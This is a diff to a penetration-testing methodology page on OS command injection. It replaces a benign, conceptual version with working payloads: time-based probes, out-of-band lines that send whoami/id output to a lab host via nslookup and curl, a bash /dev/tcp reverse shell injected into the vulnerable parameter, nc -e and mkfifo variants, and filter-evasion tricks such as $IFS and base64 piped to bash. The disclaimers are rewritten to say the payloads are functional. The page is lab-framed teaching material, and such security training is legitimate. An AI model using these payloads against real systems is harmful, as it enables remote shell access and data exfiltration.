@@ -5,7 +5,7 @@
 > - **Phase:** Web Exploitation - OWASP A03:2021 Injection (user input concatenated into a system command)
 > - **Visibility:** Medium/High - the web process spawns shell child processes (a pattern very detectable by EDR/auditd); blind variants generate outbound traffic or measurable delays
 > - **Prerequisites:** an application that builds and executes a system command including user input (ping, conversions, utilities, calls to external binaries)
-> - **Nature of the document:** methodology. Illustrative and benign payloads (only verification commands such as `id`/`whoami`), no reverse shell reproduced, no fabricated Finding ID (next `WEB-016`, to assign in lab).
+> - **Nature of the document:** methodology + practical payloads (verification, blind/OOB, reverse shell) for a lab environment. No destructive actions (no wiping/DoS); no fabricated Finding ID (next `WEB-016`, to assign in lab).
 
 - Objective: execute arbitrary commands on the server's operating system by exploiting the unsafe concatenation of user input into a shell call; here limited to non-destructive verification commands.
 
@@ -54,14 +54,36 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- 'id' executed: comma
 The execution of `id`/`whoami` confirms RCE with the privileges of the web process. Common separators are `;`,
 `|`, `&&`, `$()` and backticks; the choice depends on the context (shell, filters present).
 
-### Phase 2 - Blind variant (conceptual)
+### Phase 2 - Blind variant (time-based and out-of-band)
 
-If the output is not reflected, you confirm indirectly: a command that introduces a **measurable delay**
-(time-based) or that makes an **outbound request** to a controlled server (out-of-band). You verify execution
-from the delay or the received request, without needing to see the output in the response.
+If the output is not reflected, you confirm execution indirectly:
 
-> Note: no reverse shells or post-exploitation chains are reproduced. Confirming execution (with benign commands)
-> is sufficient to demonstrate the impact in an assessment.
+```bash
+# Time-based: measurable delay in the response
+127.0.0.1; sleep 10
+127.0.0.1 && ping -c 10 127.0.0.1
+
+# Out-of-band (OOB): outbound request to a controlled host (DNS/HTTP), observed in your own logs
+127.0.0.1; nslookup $(whoami).attacker.lab
+127.0.0.1; curl http://10.10.14.5/$(id | base64 -w0)
+```
+
+A ~10s delay or a request received on your server confirms RCE even without output in the response.
+
+### Phase 3 - From RCE to an interactive shell (lab)
+
+Once RCE is confirmed, in the lab you obtain a shell. Bash reverse shell (listener `nc -lvnp 4444` on the
+attacker, lab IP/port):
+
+```bash
+# value injected into the vulnerable parameter
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
+```
+
+Variants when bash is unavailable or filtered: `nc -e /bin/sh 10.10.14.5 4444`, `mkfifo`, Python/PHP reverse
+shells (see [07-post-exploitation](<../../../07-post-exploitation/README.en.md>) and the netcat page). Common
+filter bypasses: concatenation (`w'h'oami`), alternative separators, `$IFS` instead of spaces, base64-encoding
+the command with `echo ... | base64 -d | bash`.
 
 ## Analysis of results
 
@@ -163,8 +185,9 @@ arguments at the API level.
 ## Methodology notes
 
 In a real lab (e.g., DVWA, WebGoat or a target with network features) the data to document as a finding: the
-confirmation of execution (with a benign command), the privilege context and any escalation path, without
-reproducing reverse shells or destructive actions. Evidence must be collected with non-destructive commands.
+confirmation of execution, the privilege context, the obtained shell and any escalation path. The techniques are
+functional: run them only in an owned lab or with authorization, avoiding destructive actions (wiping, DoS) that
+are out of scope for an assessment.
 
 ## MITRE ATT&CK mapping
 
@@ -186,4 +209,4 @@ reproducing reverse shells or destructive actions. Evidence must be collected wi
 
 ---
 
-> **Note:** All described techniques are for educational and methodology-documentation purposes. Execution only on owned applications or with explicit authorization. The payloads are verification-only (benign commands); no reverse shell or destructive action is reproduced. Outputs are illustrative.
+> **Note:** Educational content. The payloads are functional (verification, blind/OOB, reverse shell) and must be executed only on owned applications or with explicit authorization, in a lab environment. IPs/ports are lab values; no destructive action (wiping/DoS) is included. Outputs are illustrative.
